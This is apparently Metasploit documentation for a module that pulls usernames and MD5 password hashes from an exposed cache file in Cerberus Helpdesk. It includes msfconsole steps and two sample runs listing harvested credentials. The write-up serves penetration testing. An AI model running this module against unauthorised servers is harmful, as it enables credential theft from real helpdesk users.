## Description

This module opens a `devblocks_cache---ch_workers` or `zend_cache---ch_workers` file which contains a
data structure with username and password hash (MD5) credentials.  The contents looks similar to JSON, however it is not.

## Vulnerable Application

This module has been verified against the following Cerberus Helpdesk versions:

1. Version 4.2.3 Stable (Build 925)
2. Version 5.4.4

However it may also work up to, but not including, version 6.7

Version 5.4.4 is available on [exploit-db.com](https://www.exploit-db.com/apps/882596e791e54529b29ecbc6f48a6cb7-cerb5-5_4_4.zip)

* of note, 5.4.4 has to be installed on a PRE php7 environment.

## Verification Steps

1. Start msfconsole
2. ```use auxiliary/gather/cerberus_helpdesk_hash_disclosure```
3. ```set rhosts [rhosts]```
4. ```run```

## Scenarios

### 4.2.3 using zend (not verbose)

  ```
    msf > use auxiliary/gather/cerberus_helpdesk_hash_disclosure
    msf auxiliary(cerberus_helpdesk_hash_disclosure) > set rhosts 1.1.1.1
    rhosts => 1.1.1.1
    msf auxiliary(cerberus_helpdesk_hash_disclosure) > run
    
    [-] Invalid response received for 1.1.1.1    for /storage/tmp/devblocks_cache---ch_workers
    [+] Found: admin:aaa34a6111abf0bd1b1c4d7cd7ebb37b
    [+] Found: example:112302c209fe8d73f502c132a3da2b1c
    [+] Found: foobar:0d108d09e5bbe40aade3de5c81e9e9c7
    
    Cerberus Helpdesk User Credentials
    ==================================
    
     Username                     Password Hash
     --------                     -------------
     admin                        aaa34a6111abf0bd1b1c4d7cd7ebb37b
     example                      112302c209fe8d73f502c132a3da2b1c
     foobar                       0d108d09e5bbe40aade3de5c81e9e9c7
    
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
  ```

### 5.4.4 using devblocks

  ```
    msf > use auxiliary/gather/cerberus_helpdesk_hash_disclosure 
    msf auxiliary(cerberus_helpdesk_hash_disclosure) > set rhosts 192.168.2.45
    rhosts => 192.168.2.45
    msf auxiliary(cerberus_helpdesk_hash_disclosure) > set targeturi /cerb5/
    targeturi => /cerb5/
    msf auxiliary(cerberus_helpdesk_hash_disclosure) > set verbose true
    verbose => true
    msf auxiliary(cerberus_helpdesk_hash_disclosure) > run
    
    [*] Attempting to load data from /cerb5/storage/tmp/devblocks_cache---ch_workers
    [+] Found: bar@none.com:37b51d194a7513e45b56f6524f2d51f2
    [+] Found: foo@none.com:acbd18db4cc2f85cedef654fccc4a4d8
    [+] Found: mike@shorebreaksecurity.com:18126e7bd3f84b3f3e4df094def5b7de
    
    Cerberus Helpdesk User Credentials
    ==================================
    
     Username                     Password Hash
     --------                     -------------
     bar@none.com                 37b51d194a7513e45b56f6524f2d51f2
     foo@none.com                 acbd18db4cc2f85cedef654fccc4a4d8
     admin@example.com            18126e7bd3f84b3f3e4df094def5b7de
    
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
  ```
